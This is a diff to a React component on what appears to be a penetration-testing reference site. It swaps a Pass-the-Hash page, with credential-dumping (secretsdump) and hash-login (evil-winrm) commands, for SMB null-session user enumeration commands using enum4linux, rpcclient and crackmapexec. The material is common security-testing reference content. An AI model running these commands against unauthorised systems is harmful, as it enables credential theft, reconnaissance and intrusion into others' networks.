@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const PassTheHash = ({ title }: IProps) => {
+const GetUserswithSMBNullSession = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -35,30 +35,31 @@ const PassTheHash = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              A Pass-the-Hash (PtH) attack is a technique whereby an attacker
-              captures a password hash (as opposed to the password characters)
-              and then simply passes it through for authentication and
-              potentially lateral access to other networked systems. The threat
-              actor doesn’t need to decrypt the hash to obtain a plain text
-              password. Note: PtH is not possible with NTLMv2. NTLM has been
-              succeeded by NTLMv2, which is a hardened version of the original
-              NTLM protocol. NTLMv2 includes a time-based response, which makes
-              simple pass the hash attacks impossible.
+              SMB NULL sessions allow an unauthenticated attacker to retrieve
+              information from the domain, such as a complete listing of users,
+              groups, computers, user account attributes, and the domain
+              password policy.
             </Typography>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 1</Typography>
-            <Typography>
-              This step is not needed, if you have obtained the NTLM hash other
-              way, then you can go straight to step 2. This step is just a
-              common way to dump credentials.
-            </Typography>
+            <Typography variant="h6">Option 1 - enum4linux</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
+              {
+                'enum4linux -U {IP}  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"'
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 2</Typography>
+            <Typography variant="h6">Option 2 - rpcclient</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"evil-winrm -H {NTLM_HASH} -u administrator -i {IP}"}
+              {'rpcclient -U "" -N {IP}'}
+            </SyntaxHighlighter>
+            <Box sx={{ m: 2 }} />
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"rpcclient $> enumdomusers "}
+            </SyntaxHighlighter>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Option 3 - CrackMapExec</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"crackmapexec smb {IP} --users"}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -67,4 +68,4 @@ const PassTheHash = ({ title }: IProps) => {
   );
 };
 
-export default PassTheHash;
+export default GetUserswithSMBNullSession;
